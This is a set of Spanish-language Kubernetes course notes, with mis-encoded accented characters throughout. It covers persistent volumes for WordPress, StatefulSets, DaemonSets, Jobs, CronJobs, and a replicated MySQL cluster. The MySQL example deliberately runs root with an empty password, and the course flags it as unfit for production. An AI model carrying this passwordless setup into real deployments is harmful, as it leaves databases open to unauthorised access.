wordpress-vol\n              mountPath: /var/www/html\n      volumes:\n        - name: wordpress-vol\n          persistentVolumeClaim:\n            claimName: wordpress-pvc\n\nComo observamos vamos a usar el volumen asociado al PersistentVolumenClaim wordpress-pvc y que lo vamos a montar en el directorio DocumentRoot del servidor web: /var/www/html.\nDe forma similar, modificamos el fichero mariadb-deployment.yaml:\n...\n    spec:\n      containers:\n    ...\n          volumeMounts:\n            - name: mariadb-vol\n              mountPath: /var/lib/mysql\n      volumes:\n        - name: mariadb-vol\n          persistentVolumeClaim:\n            claimName: mariadb-pvc\n\nEn esta ocasi√≥n usaremos el volumen asociado a mariadb-pvc y el punto de montaje se har√° sobre el directorio donde se guarda la informaci√≥n de la base de datos: /var/lib/mysql.\nEvidentemente, no es necesario modificar la definici√≥n de los otros recursos: Services e Ingress.\nCreamos el Deployment, los Services y el Ingress:\n\nmariadb-srv.yaml\nwordpress-srv.yaml\nwordpress-ingress.yaml\n\nkubectl apply -f mariadb-deployment.yaml\nkubectl apply -f mariadb-srv.yaml\nkubectl apply -f wordpress-deployment.yaml\nkubectl apply -f wordpress-srv.yaml\nkubectl apply -f wordpress-ingress.yaml\n\nAcedemos a la aplicaci√≥n y la configuramos:\n \nImagen de elaboraci√≥n propia (CC BY-NC-SA)\nImagen de elaboraci√≥n propia (CC BY-NC-SA)\nComprobando la persistencia de la informaci√≥n\nSi en cualquier momento tenemos que eliminar o actualizar uno de los despliegues, podemos comprobar que la informaci√≥n sigue existiendo despu√©s de volver a crear los Deployments:\nkubectl delete -f mariadb-deployment.yaml\nkubectl delete -f wordpress-deployment.yaml\nkubectl apply -f mariadb-deployment.yaml\nkubectl apply -f wordpress-deployment.yaml\n\nSi volvemos acceder, comprobamos que la aplicaci√≥n sigue funcionando con toda la informaci√≥n:\nImagen de elaboraci√≥n propia (CC BY-NC-SA)"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/9.0-otras-cargas-de-trabajo":{"title":"9.0-otras-cargas-de-trabajo","links":[],"tags":[],"content":"9. Otras cargas de trabajo\n¬øPodemos usar un despliegue para todo?\nHasta ahora hemos visto con bastante detalle el uso de los despliegues (Deployments) en Kubernetes. Los despliegues son una herramienta enormemente potente ya que nos permiten adecuar el n√∫mero de pods a la demanda y garantizan el funcionamiento continuo, tanto en el caso de que haya alg√∫n nodo con problemas, como en el caso de actualizaciones que se pueden realizar de forma continua. Sin embargo, no es posible utilizar despliegues en todos los casos, hay determinadas situaciones en las que hay cargas de trabajo (workloads) que no se ajustan adecuadamente a un despliegue de Kubernetes, por lo que se han desarrollado otros objetos para esas situaciones diferentes.\nS√≠ es conveniente remarcar, que siempre que sea posible es mejor definir una carga de trabajo como un despliegue en Kubernetes y limitar el uso de las otras cargas de trabajo que vamos a ver a continuaci√≥n para casos espec√≠ficos. Luego la respuesta a la pregunta con la que empezamos este m√≥dulo es no, no podemos usar un despliegue para todo, pero s√≠ debemos usarlo prioritariamente siempre que sea posible.\nAplicaciones con estado o sin estado\nUna caracter√≠stica de una aplicaci√≥n que es muy importante para Kubernetes es si se trata de una aplicaci√≥n con estado (stateful) o sin estado (stateless). Una aplicaci√≥n sin estado es aquella en la que las peticiones son totalmente independientes unas de otras y no necesita ninguna referencia de una petici√≥n anterior. Un ejemplo de una aplicaci√≥n sin estado ser√≠a un servicio DNS, en el que cada vez que se realiza una petici√≥n es totalmente independiente de las anteriores o posteriores que se hagan. Las aplicaciones sin estado son perfectas para desplegarse el Kubernetes, ya que se ajustan perfectamente a un Deployment y se pueden escalar y balancear sin problemas, ya que cada pod responder√° a las peticiones que reciba de forma independiente al resto.\nPor contra, las aplicaciones con estado son aquellas en las que una petici√≥n puede verse afectada por el resultado de las anteriores y a su vez puede afectar a las posteriores (por eso se dice que tiene estado). Una base de datos ser√≠a el paradigma de una aplicaci√≥n con estado, puesto que cada modificaci√≥n que hagamos a la base de datos puede afectar a las consultas posteriores. Una aplicaci√≥n con estado no se ajusta bien a un Deployment de Kubernetes, ya que de forma general, un cluster de pods independientes no puede tener en cuenta el estado de la aplicaci√≥n correctamente.\nEsto enlaza con el modelo de desarrollo de las aplicaciones, ya que si pensamos en la mayor√≠a de las aplicaciones que utilizamos hoy en d√≠a, se trata de aplicaciones con estado, lo que inicialmente podr√≠a limitar su uso en Kubernetes. Sin embargo, si descomponemos estas aplicaciones en muchos y peque√±os servicios que se intercomuniquen entre s√≠, bastantes de ellos se podr√°n gestionar como aplicaciones sin estado, mientras que otros tendr√°n que ser aplicaciones con estado. √âste es uno de los enfoques m√°s utilizados hoy en d√≠a para desplegar aplicaciones en Kubernetes, hacer que la aplicaci√≥n se ajuste al modelo de microservicios, para utilizar Deployments en todos los microservicios sin estado que se pueda y utilizar otras cargas de trabajo para el resto de componentes. En esta unidad veremos una peque√±a introducci√≥n a estas otras cargas de trabajo."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/9.1-statefulsets":{"title":"9.1-statefulsets","links":[],"tags":[],"content":"9.1 StatefulSets\nEl objeto StatefulSet controla el despliegue de Pods con identidades √∫nicas y persistentes, y nombres de host estables. El uso de StatefulSets es alternativo al de despliegues (Deployments) y su objetivo principal es poder utilizar en Kubernetes aplicaciones m√°s restrictivas que no se ajusten bien a las caracter√≠sticas de los despliegues, principalmente aplicaciones con estado que necesiten algunas caracter√≠sticas fijas y estables en los Pods, algo que no puede ocurrir con los despliegues en los pods que son completamente indistinguibles unos de otros y la aplicaci√≥n puede utilizar cualquiera de ellos en cada momento.\nVeamos algunos ejemplos en los es adecuado utilizar StatefulSet en lugar de Deployment y por qu√©:\n\nUn despliegue de redis primario-secundario: necesita que el primario est√© operativo antes de que podamos configurar las r√©plicas.\nUn cluster mongodb: Los diferentes nodos deben tener una identidad de red persistente (ya que el DNS es est√°tico), para que se produzca la sincronizaci√≥n despu√©s de reinicios o fallos.\nZookeeper: cada nodo necesita almacenamiento √∫nico y estable, ya que el identificador de cada nodo se guarda en un fichero.\n\nPor lo tanto el objeto StatefulSet nos ofrece las siguientes caracter√≠sticas:\n\nEstable y √∫nico identificador de red (Ejemplo mongodb)\nAlmacenamiento estable (Ejemplo Zookeeper)\nDespliegues y escalado ordenado (Ejemplo redis)\nEliminaci√≥n y actualizaciones ordenadas\n\nPor lo tanto cada Pod es distinto (tiene una identidad √∫nica), y este hecho tiene algunas consecuencias:\n\nEl nombre de cada Pod tendr√° un n√∫mero (1,2,‚Ä¶) que lo identifica y que nos proporciona la posibilidad de que la creaci√≥n actualizaci√≥n y eliminaci√≥n sea ordenada. Se crear√°n en orden ascendente y se eliminar√°n en orden descendente.\nSi un nuevo Pod es recreado, obtendr√° el mismo nombre (hostname), los mismos nombres DNS (aunque la IP pueda cambiar) y el mismo volumen que ten√≠a asociado.\nNecesitamos crear un Service especial, llamado Headless Service, que nos permite acceder a los Pods de forma independiente, pero que no balancea la carga entre ellos, por lo tanto este Service no tendr√° una ClusterIP.\n\nStatefulSet vs Deployment\n\nA diferencia de un Deployment, un StatefulSet mantiene una identidad fija para cada uno de sus Pods.\nEliminar y/o escalar un StatefulSet no eliminar√° los vol√∫menes asociados con StatefulSet.\nStatefulSets actualmente requiere que un Headless Service sea responsable de la identidad de red de los Pods.\nAl utilizar StatefulSet, cada Pod recibe un PersistentVolume independiente.\nStatefulSet actualmente no admite el escalado autom√°tico.\n\nCreando el Headless Service para acceder a los Pods del StatefulSet\nUna de las caracter√≠sticas de los Pods controlados por un StatefulSet es que son √∫nicos (todos los Pods son distintos), por lo tanto al acceder a ellos por medio de la definici√≥n de un Service no necesitamos el balanceo de carga entre ellos.\nPara acceder a los Pods de un StatefulSet vamos a crear un Service Headless que se caracteriza por no tener IP (ClusterIP) y por lo tanto no va a balancear la carga entre los distintos Pods. Este tipo de Service va a crear una entrada DNS por cada Pod, que nos permitir√° acceder a cada Pod de forma independiente. El nombre DNS que se crear√° ser√° &lt;nombre del Pod&gt;.&lt;dominio del StatefulSet&gt;. El dominio del StatefulSet se indicar√° en la definici√≥n del recurso usando el par√°metro serviceName.\nVeamos un ejemplo de definici√≥n de un Headless Service (fichero service.yaml):\napiVersion: v1\nkind: Service\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\nspec:\n  ports:\n  - port: 80\n    name: web\n  clusterIP: None\n  selector:\n    app: nginx\n\nEn esta definici√≥n podemos observar que al indicar clusterIP: None estamos creando un Headless Service, que no tendr√° ClusterIP (por lo que no balancear√° la carga entre los pods). Este Service ser√° el responsable de crear, por cada Pod seleccionado con el selector, una entrada DNS.\nCreando el recurso StatefulSet\nVamos a definir nuestro recurso StatefulSet en un fichero yaml statefulset.yaml:\napiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: web\nspec:\n  serviceName: &quot;nginx&quot;\n  replicas: 2\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: k8s.gcr.io/nginx-slim:0.8\n        ports:\n        - containerPort: 80\n          name: web\n        volumeMounts:\n        - name: www\n          mountPath: /usr/share/nginx/html\n  volumeClaimTemplates:\n  - metadata:\n      name: www\n    spec:\n      accessModes: [ &quot;ReadWriteOnce&quot; ]\n      resources:\n        requests:\n          storage: 1Gi\n\nVamos a estudiar las caracter√≠sticas de la definici√≥n de este recurso:\n\nCon el par√°metro serviceName indicaremos el nombre de dominio que va a formar parte del nombre DNS que el Headless Service va a crear para cada Pod.\nCon el par√°metro selector se indica los Pods que vamos a controlar con StatefulSet.\nUna de las caracter√≠sticas que hemos indicado del StatefulSet es que cada Pod va a tener un almacenamiento estable. El tipo de almacenamiento se indica con el par√°metro volumeClaimTemplates que se define de forma similar a un PersistentVolumenClaim.\nAdem√°s observamos en la definici√≥n del contenedor que el almacenamiento que hemos definido se va a montar en cada Pod (en este ejemplo el punto de montaje es el DocumentRoot de nginx), con el par√°metro volumeMounts.\n\nEjemplo: Creaci√≥n de un StatefulSet\nVamos a crear los recursos estudiados en este apartado: el Service Headless y el StatefulSet, y vamos a comprobar sus caracter√≠sticas.\nLo primero es crear el Headless Service:\nkubectl apply -f service.yaml\n\nCreaci√≥n ordenada de Pods\nEl statefulSet que hemos definido va a crear dos Pods (replicas: 2). Para observar c√≥mo se crean de forma ordenada podemos usar dos terminales, en la primera ejecutamos:\nwatch kubectl get pod\n\nCon esta instrucci√≥n vamos a ver en ‚Äúvivo‚Äù c√≥mo se van creando los Pods, que vamos a crear al ejecutar en otra terminal la instrucci√≥n:\nkubectl apply -f statefulset.yaml\n\nComprobamos la identidad de red estable\nEn este caso vamos a comprobar que los hostname y los nombres DNS son estables para cada Pod. Las ips de los Pods pueden cambiar si eliminamos el recurso StatefulSet y lo volvemos a crear, pero los nombres van a permanecer.\nPara ver los nombres de los Pods podemos ejecutar lo siguiente:\nfor i in 0 1; do kubectl exec web-$i -- sh -c &#039;hostname&#039;; done\nweb-0\nweb-1\n\nVeamos los nombres DNS. En este ejemplo el Headless Service ha creado una entrada en el DNS para cada Pod. El nombre DNS que se crear√° ser√° &lt;nombre del pod&gt;.&lt;dominio del StatefulSet&gt;. El dominio del StatefulSet se indicar√° en la definici√≥n del recurso usando el par√°metro serviceName. En este caso el nombre del primer Pod ser√° web-0.nginx. Vamos a comprobarlo, haciendo una consulta DNS desde otro pod:\nkubectl run -i --tty --image busybox:1.28 dns-test --restart=Never --rm\n/ # nslookup web-0.nginx\n...\nAddress 1: 172.17.0.4 web-0.nginx.default.svc.cluster.local\n/ # nslookup web-1.nginx\n...\nAddress 1: 172.17.0.5 web-1.nginx.default.svc.cluster.local\n\nEliminaci√≥n de pods\nPodemos usar las dos terminales para observar c√≥mo la eliminaci√≥n tambi√©n se hace de forma ordenada. En la primera terminal ejecutamos:\nwatch kubectl get pod\n\nY en la segunda:\nkubectl delete pod -l app=nginx\n\nAl eliminar los Pods, el statefulSet ha creado nuevos Pods que ser√°n id√©nticos a los anteriores y por lo tanto mantendr√°n la identidad de red, es decir tendr√°n los mismos hostname y los mismos nombres DNS (aunque es posible que cambien las ip):\nfor i in 0 1; do kubectl exec web-$i -- sh -c &#039;hostname&#039;; done\nweb-0\nweb-1\n\nkubectl run -i --tty --image busybox:1.28 dns-test --restart=Never --rm\n/ # nslookup web-0.nginx\n...\n/ # nslookup web-1.nginx\n...\n\nEscribiendo en los vol√∫menes persistente\nPodemos comprobar que se han creado los distintos vol√∫menes para cada pod:\nkubectl get pv,pvc\n\nY podemos comprobar que realmente la informaci√≥n que guardemos en el directorio que hemos montado en cada Pod es persistente:\nfor i in 0 1; do kubectl exec &quot;web-$i&quot; -- sh -c &#039;echo &quot;$(hostname)&quot; &gt; /usr/share/nginx/html/index.html&#039;; done\nfor i in 0 1; do kubectl exec -i -t &quot;web-$i&quot; -- sh -c &#039;curl http://localhost/&#039;; done\nweb-0\nweb-1\n\nAhora si eliminamos los Pods, los nuevos Pods creados mantendr√°n la informaci√≥n:\nkubectl delete pod -l app=nginx\nfor i in 0 1; do kubectl exec -i -t &quot;web-$i&quot; -- sh -c &#039;curl http://localhost/&#039;; done\nweb-0\nweb-1\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/9.2-daemonsets":{"title":"9.2-daemonsets","links":[],"tags":[],"content":"9.2 DaemonSets\nEl objeto DaemonSet (DS) se utiliza cuando queremos ejecutar un pod en todos los nodos del cluster o al menos en un conjunto de ellos que tienen una serie de caracter√≠sticas en com√∫n. Un DaemonSet se utiliza en algunas circunstancias muy concretas, por ejemplo:\n\nEjecutar un pod en cada nodo para la monitorizaci√≥n del cluster: Prometheus, Sysdig, collectd, datadog, etc.\nEjecutar un pod en cada nodo para la recolecci√≥n y gesti√≥n de logs: fluentd, logstash\nEjecutar un pod en cada nodo para el almacenamiento del cluster: ceph o glusterfs\n\nUn ejemplo de DaemonSet tendr√≠a el siguiente aspecto:\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: daemonset1\nspec:\n  selector:\n      matchLabels:\n        name: daemonset-pod \n  template:               # Plantilla con las caracter√≠sticas del Pod\n    metadata:\n      labels:\n        name: daemonset-pod \n    spec:\n      nodeSelector:\n        type: worker-prod # Etiqueta del nodo en el que se ejecuta (opcional)\n      containers:\n      - name: daemon-pod\n        image: ...\n\nLos par√°metros tienen los valores habituales anteriormente descritos y en este caso, se incluye una plantilla con la descripci√≥n del pod que se ejecutar√° en cada nodo (en este caso en cada nodo con etiqueta worker-prod)."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/9.3-jobs-y-cronjobs":{"title":"9.3-jobs-y-cronjobs","links":[],"tags":[],"content":"9.3 Jobs y Cronjobs\nJob\nEl objeto Job se utiliza cuando queremos ejecutar una tarea puntual, para lo que se define el objeto y se crean todos los objetos necesarios para realizarla, principalmente creando uno o varios Pods hasta que se finaliza la tarea. Una vez se termina la tarea y de forma general, los pods permanecer√°n creados y no se borrar√°n hasta que se elimine el Job que los cre√≥.\nUn ejemplo de Job tendr√≠a el siguiente aspecto:\napiVersion: batch/v1\nkind: Job\nmetadata:\n  name: pi\nspec:\n  template:\n    spec:\n      containers:\n      - name: pi\n        image: perl\n        command: [&quot;perl&quot;,  &quot;-Mbignum=bpi&quot;, &quot;-wle&quot;, &quot;print bpi(2000)&quot;]\n      restartPolicy: Never\n  backoffLimit: 4\n\nEn el ejemplo anterior se lanza un contenedor de la imagen perl y realiza el c√°lculo de Pi con una precisi√≥n de 2000 decimales utilizando este lenguaje.\nUna vez lanzada la tarea, podremos ver que se crea tanto un objeto Job como un Pod, el primero aparece sin finalizar y el Pod aparece ejecut√°ndose:\nNAME           READY   STATUS    RESTARTS   AGE\npod/pi-jbt4r   1/1     Running   0          4s\n\n...\n\nNAME           COMPLETIONS   DURATION   AGE\njob.batch/pi   0/1           4s         4s\n\nSin embargo, una vez que la tarea del contenedor finaliza, en este caso cuando se consigue el n√∫mero Pi con dos mil decimales de precisi√≥n, el Pod se para y la tarea se marca como completada:\nNAME           READY   STATUS      RESTARTS   AGE\npod/pi-jbt4r   0/1     Completed   0          10s\n\n....\n\nNAME           COMPLETIONS   DURATION   AGE\njob.batch/pi   1/1           9s         10s\n\nPodemos ver que no se borra el Pod, ya que lo necesitamos en muchas ocasiones para ver el resultado de la tarea. En este caso para ver el n√∫mero Pi con la precisi√≥n solicitada, ver√≠amos los logs del pod:\nkubectl logs pi-jbt4r\n3.1415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679821480865132823066470938446095505822317253594081284811174502841027019385211055596446229489549303819644288109756659334461284756482337867831652712019091456485669234603486104543266482133936072602491412737245870066063155881748815209209628292540917153643678925903600113305305488204665213841469519415116094330572703657595919530921861173819326117931051185480744623799627495673518857527248912279381830119491298336733624406566430860213949463952247371907021798609437027705392171762931767523846748184676694051320005681271452635608277857713427577896091736371787214684409012249534301465495853710507922796892589235420199561121290219608640344181598136297747713099605187072113499999983729780499510597317328160963185950244594553469083026425223082533446850352619311881710100031378387528865875332083814206171776691473035982534904287554687311595628638823537875937519577818577805321712268066130019278766111959092164201989380952572010654858632788659361533818279682303019520353018529689957736225994138912497217752834791315155748572424541506959508295331168617278558890750983817546374649393192550604009277016711390098488240128583616035637076601047101819429555961989467678374494482553797747268471040475346462080466842590694912933136770289891521047521620569660240580381501935112533824300355876402474964732639141992726042699227967823547816360093417216412199245863150302861829745557067498385054945885869269956909272107975093029553211653449872027559602364806654991198818347977535663698074265425278625518184175746728909777727938000816470600161452491921732172147723501414419735685481613611573525521334757418494684385233239073941433345477624168625189835694855620992192221842725502542568876717904946016534668049886272327917860857843838279679766814541009538837863609506800642251252051173929848960841284886269456042419652850222106611863067442786220391949450471237137869609563643719172874677646575739624138908658326459958133904780275901\n\nPara seguir aprendiendo\nOcultar\n\nPara m√°s informaci√≥n acerca de los Jobs puedes leer la documentaci√≥n de la API.\n\nOcultar\nCronJob\nEn el caso de que la tarea que tengamos que realizar no sea puntual, sino que se tenga que repetir cada cierto tiempo conforme a un patr√≥n, k8s ofrece el objeto CronJob, que crear√° tareas conforme a la periodicidad que se indique.\nEn el siguiente ejemplo de CronJob, ejecutamos una tarea cada minuto, en la que se muestra la fecha y hora junto al texto ‚ÄúCurso del CEP‚Äù:\napiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: hello\nspec:\n  schedule: &quot;*/1 * * * *&quot;\n  jobTemplate:\n    spec:\n      template:\n        spec:\n          containers:\n          - name: hello\n            image: busybox\n            imagePullPolicy: IfNotPresent\n            command:\n            - /bin/sh\n            - -c\n            - date; echo Curso del CEP\n          restartPolicy: OnFailure\n\nPara la definici√≥n del objeto CronJob debe especificarse un nombre y el patr√≥n de repetici√≥n conforme al cron de UNIX, adem√°s de incluir en jobTemplate la definici√≥n del objeto Job que se desea ejecutar."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/ejemplo-despliegue-de-un-cluster-con-mysql":{"title":"ejemplo-despliegue-de-un-cluster-con-mysql","links":[],"tags":[],"content":"Ejemplo: despliegue de un cluster con MySQL\nOcultar\nUna base de datos relacional es un ejemplo perfecto de aplicaci√≥n con estado, cualquier petici√≥n puede depender del estado resultante de una petici√≥n anterior, y todas las peticiones deben consultar o modificar la base de datos que incluya la √∫ltima modificaci√≥n realizada. Las implicaciones que tiene esto si queremos desplegar la base de datos sobre Kubernetes son importantes, ya que ser√° necesario que la base de datos se pueda desplegar en un cluster para proporcionar disponibilidad, se pueda adaptar a variaciones de demanda y no haya interrupciones, mientras que hay que garantizar que todos los pods accedan a la base de datos de forma coherente.\n\n¬øPodemos utilizar un Deployment con r√©plicas indistinguibles que se crean o destruyen a demanda?\n¬øNecesitamos un volumen adicional para almacenar localmente la base de datos en cada pod?\n¬øC√≥mo garantizamos la replicaci√≥n de la base de datos entre los nodos?\n\nHay diferentes formas de afrontar esto y dependen mucho de las caracter√≠sticas de la base de datos en cuesti√≥n. En este ejemplo vamos a desplegar un cluster de MySQL con un nodo primario (tambi√©n denominado master) en modo lectura y escritura (se podr√°n hacer consultas y modificaciones de la base de datos) y varios nodos secundarios en modo lectura (s√≥lo se utilizar√°n para realizar consultas). Utilizaremos para ello un StatefulSet, en el que los diferentes pods son distinguibles entre s√≠, tienen siempre el mismo nombre DNS interno y el mismo volumen se conecta siempre al mismo pod. El primer nodo que se desplegar√° ser√° el primario, con un volumen asociado para la base de datos, el resto de nodos se arrancar√°n despu√©s del primario y al iniciarse sincronizar√°n la base de datos con la del primario y la almacenar√°n tambi√©n en un volumen diferente para cada Pod.\nEste ejemplo es probablemente el m√°s avanzado de todo el curso y utilizaremos adem√°s otros recursos como ConfigMap, Services o vol√∫menes. Este ejemplo est√° extra√≠do directamente de la documentaci√≥n de k8s: Run a Replicated Stateful Application.\nNota\nOcultar\nNota Las caracter√≠sticas de este cluster no son para poner en producci√≥n, ya que se ha simplificado la configuraci√≥n de MySQL, para centrarnos en los aspectos relacionados con Kubernetes.\nNota\nOcultar\nNota En caso de no tener recursos suficientes para realizar este ejemplo, se puede reducir el n√∫mero de r√©plicas a dos, o bien eliminar el cluster y volverlo a crear con suficientes recursos (en el ejemplo siguiente creamos un nuevo cluster de k8s con 6 GiB de RAM y 4 cores virtuales:\nminikube stop\nminikube delete\nminikube start --driver ... --memory 6144 --cpus 4\n\nOcultar\nVamos pues con la creaci√≥n de este cluster, para lo que utilizaremos diferentes objetos de Kubernetes que hemos visto durante todo el curso.\nCreamos un ConfigMap para modificar el fichero de configuraci√≥n de MySQL, de manera que el primario genere los registros para la sincronizaci√≥n y los secundarios act√∫en en modo lectura: configmap.yaml\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: mysql\n  labels:\n    app: mysql\ndata:\n  primary.cnf: |\n    # Modificaci√≥n del primario\n    [mysqld]\n    log-bin\n  replica.cnf: |\n    # Modificaci√≥n de los secundarios\n    [mysqld]\n    super-read-only\n\nkubectl apply -f configmap.yaml\n\nCreamos dos servicios, uno de tipo Headless asociado con el StatefulSet para gestionar los nombres internos de los pods y otro para balancear entre los diferentes pods secundarios las peticiones de lectura: servicios.yaml\n# Servicio para usar los nombres DNS internamente\napiVersion: v1\nkind: Service\nmetadata:\n  name: mysql\n  labels:\n    app: mysql\nspec:\n  ports:\n  - name: mysql\n    port: 3306\n  clusterIP: None\n  selector:\n    app: mysql\n---\n# Servicio para balancear los clientes entre los nodos secundarios\n# en modo lectura\napiVersion: v1\nkind: Service\nmetadata:\n  name: mysql-read\n  labels:\n    app: mysql\nspec:\n  ports:\n  - name: mysql\n    port: 3306\n  selector:\n    app: mysql\n\nkubectl apply -f servicios.yaml\n\nY ya por √∫ltimo creamos el StatefulSet, que en este caso es el objeto m√°s complicado que vamos a ver en este curso. Veamos los elementos que utiliza:\n\nEst√° formado inicialmente por tres pods, de los que en el primero se ejecutar√° el servidor MySQL primario y en los otros dos los servidores MySQL secundarios.\nSe define un volumen de 10 GiB para cada pod a trav√©s de un volumeClaim.\nUtiliza dos contenedores en cada pod, el principal que se encarga de ejecutar el proceso mysql y uno adicional que se encarga de la sincronizaci√≥n de la base de datos mediante XtraBackup. Ambos contenedores deben poder acceder al mismo volumen en el que se encuentra la base de datos, en el punto de montaje /var/lib/mysql.\nUtiliza InitContainers que no hemos visto en el curso; estos contenedores se ejecutan dentro del pod antes del contenedor normal y se utilizan para realizar configuraciones o modificaciones previas a la utilizaci√≥n del contenedor que va a ejecutar la aplicaci√≥n. Una vez que el InitContainer ha finalizado se lanza el contenedor normal. En este caso se utilizan para la configuraci√≥n inicial del contenedor mysql mediante un script que se lanza como un comando (si el √≠ndice es 0 configura el contenedor como primario y si es otro n√∫mero, lo hace como secundario). El otro InitContainer se utiliza para clonar inicialmente la base de datos en los secundarios con xtrabackup.\nSe establece l√≠mite de consumo de recursos y se definen las pruebas de disponibilidad para que Kubernetes pueda comprobar si se est√° ofreciendo el servicio de forma adecuada.\nSe define el acceso a la base de datos sin contrase√±a, lo que hace que el sistema no sea v√°lido para un despliegue real.\n\nstatefulset.yaml\napiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: mysql\nspec:\n  selector:\n    matchLabels:\n      app: mysql\n  serviceName: mysql\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: mysql\n    spec:\n      initContainers:\n      - name: init-mysql\n        image: mysql:5.7\n        command:\n        - bash\n        - &quot;-c&quot;\n        - |\n          set -ex\n          # Numera los servidores en funci√≥n del √≠ndice del pod\n          [[ `hostname` =~ -([0-9]+)$ ]] || exit 1\n          ordinal=${BASH_REMATCH[1]}\n          echo [mysqld] &gt; /mnt/conf.d/server-id.cnf\n          # Establece el n√∫mero del servidor a partir de 100\n          echo server-id=$((100 + $ordinal)) &gt;&gt; /mnt/conf.d/server-id.cnf\n          # Modifica MySQL con el ConfigMap en funci√≥n de si es el primario (0) o no\n          if [[ $ordinal -eq 0 ]]; then\n            cp /mnt/config-map/primary.cnf /mnt/conf.d/\n          else\n            cp /mnt/config-map/replica.cnf /mnt/conf.d/\n          fi\n        volumeMounts:\n        - name: conf\n          mountPath: /mnt/conf.d\n        - name: config-map\n          mountPath: /mnt/config-map\n      - name: clone-mysql\n        image: gcr.io/google-samples/xtrabackup:1.0\n        command:\n        - bash\n        - &quot;-c&quot;\n        - |\n          set -ex\n          # No clona si ya existen datos.\n          [[ -d /var/lib/mysql/mysql ]] &amp;&amp; exit 0\n          # No clona si se trata del primario.\n          [[ `hostname` =~ -([0-9]+)$ ]] || exit 1\n          ordinal=${BASH_REMATCH[1]}\n          [[ $ordinal -eq 0 ]] &amp;&amp; exit 0\n          # Clona los datos del pod inmediatamente anterior\n          ncat --recv-only mysql-$(($ordinal-1)).mysql 3307 | xbstream -x -C /var/lib/mysql\n          # Prepara la copia de seguridad\n          xtrabackup --prepare --target-dir=/var/lib/mysql\n        volumeMounts:\n        - name: data\n          mountPath: /var/lib/mysql\n          subPath: mysql\n        - name: conf\n          mountPath: /etc/mysql/conf.d\n      containers:\n      - name: mysql\n        image: mysql:5.7\n        env:\n        - name: MYSQL_ALLOW_EMPTY_PASSWORD\n          value: &quot;1&quot;\n        ports:\n        - name: mysql\n          containerPort: 3306\n        volumeMounts:\n        - name: data\n          mountPath: /var/lib/mysql\n          subPath: mysql\n        - name: conf\n          mountPath: /etc/mysql/conf.d\n        resources:\n          requests:\n            cpu: 200m\n            memory: 1Gi\n        livenessProbe:\n          exec:\n            command: [&quot;mysqladmin&quot;, &quot;ping&quot;]\n          initialDelaySeconds: 30\n          periodSeconds: 10\n          timeoutSeconds: 5\n        readinessProbe:\n          exec:\n            # Comprueba si se pueden hacer consultas sobre TCP\n            command: [&quot;mysql&quot;, &quot;-h&quot;, &quot;127.0.0.1&quot;, &quot;-e&quot;, &quot;SELECT 1&quot;]\n          initialDelaySeconds: 5\n          periodSeconds: 2\n          timeoutSeconds: 1\n      - name: xtrabackup\n        image: gcr.io/google-samples/xtrabackup:1.0\n        ports:\n        - name: xtrabackup\n          containerPort: 3307\n        command:\n        - bash\n        - &quot;-c&quot;\n        - |\n          set -ex\n          cd /var/lib/mysql\n\n          # Determina la posici√≥n de log a clonar.\n          if [[ -f xtrabackup_slave_info &amp;&amp; &quot;x$(&lt;xtrabackup_slave_info)&quot; != &quot;x&quot; ]]; then\n            # Modificaciones previas\n            cat xtrabackup_slave_info | sed -E &#039;s/;$//g&#039; &gt; change_master_to.sql.in\n            rm -f xtrabackup_slave_info xtrabackup_binlog_info\n          elif [[ -f xtrabackup_binlog_info ]]; then\n            # Si existe xtrabackup_binlog_info, estamos clonando desde el primario\n            [[ `cat xtrabackup_binlog_info` =~ ^(.*?)[[:space:]]+(.*?)$ ]] || exit 1\n            rm -f xtrabackup_binlog_info xtrabackup_slave_info\n            echo &quot;CHANGE MASTER TO MASTER_LOG_FILE=&#039;${BASH_REMATCH[1]}&#039;,\\\n                  MASTER_LOG_POS=${BASH_REMATCH[2]}&quot; &gt; change_master_to.sql.in\n          fi\n\n          # Se comprueba si es necesaria completar un clon iniciando la replicaci√≥n.\n          if [[ -f change_master_to.sql.in ]]; then\n            echo &quot;Esperando a que mysqld est√© disponible&quot;\n            until mysql -h 127.0.0.1 -e &quot;SELECT 1&quot;; do sleep 1; done\n\n            echo &quot;Inicializando la r√©plica desde la √∫ltima modificaci√≥n&quot;\n            mysql -h 127.0.0.1 \\\n                  -e &quot;$(&lt;change_master_to.sql.in), \\\n                          MASTER_HOST=&#039;mysql-0.mysql&#039;, \\\n                          MASTER_USER=&#039;root&#039;, \\\n                          MASTER_PASSWORD=&#039;&#039;, \\\n                          MASTER_CONNECT_RETRY=10; \\\n                        START SLAVE;&quot; || exit 1\n            # En caso de que el contenedor se reinicie, se intenta de nuevo.\n            mv change_master_to.sql.in change_master_to.sql.orig\n          fi\n\n          # Lanza un servidor que pueda mandar copias solicitadas por otros.\n          exec ncat --listen --keep-open --send-only --max-conns=1 3307 -c \\\n            &quot;xtrabackup --backup --slave-info --stream=xbstream --host=127.0.0.1 --user=root&quot;\n        volumeMounts:\n        - name: data\n          mountPath: /var/lib/mysql\n          subPath: mysql\n        - name: conf\n          mountPath: /etc/mysql/conf.d\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      volumes:\n      - name: conf\n        emptyDir: {}\n      - name: config-map\n        configMap:\n          name: mysql\n  volumeClaimTemplates:\n  - metadata:\n      name: data\n    spec:\n      accessModes: [&quot;ReadWriteOnce&quot;]\n      resources:\n        requests:\n          storage: 10Gi\n\nkubectl apply -f statefulset.yaml\n\nPodemos ir comprobando con kubectl c√≥mo se van creando los diferentes pods y contenedores, tanto los InitContainers como los contenedores de cada pod y al tratarse de un StatefulSet, los 